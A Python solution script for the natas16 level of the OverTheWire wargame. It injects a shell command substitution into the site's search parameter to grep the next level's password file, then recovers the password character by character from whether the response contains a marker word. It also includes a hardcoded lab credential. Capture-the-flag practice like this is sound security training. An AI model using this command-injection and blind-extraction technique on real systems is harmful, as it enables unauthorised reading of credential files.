# Python script for natas 16
# Goes through 32 characters that are ASCII characters (capital and minor) and numerals 0-9,
# Returns password for level 17.


import string
import requests

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")
characters = string.ascii_letters + string.digits
password = ""

def test_char(char, current_psw, retries=3):
    payload = {
        "needle": f'$(grep ^{current_psw+char} /etc/natas_webpass/natas17)hamburger',
        "submit":"Search"
    }
    for attempt in range(retries):
        try:
            response = requests.get(url, params=payload, auth=auth)
            # If words with hamburger end up in print, means we have character that is in password
            return "hamburger" not in response.text
        except:
            return False

for position in range(1,33):
    for char in characters:
        if test_char(char, password):
            print(char)
            password += char
            break
print(password)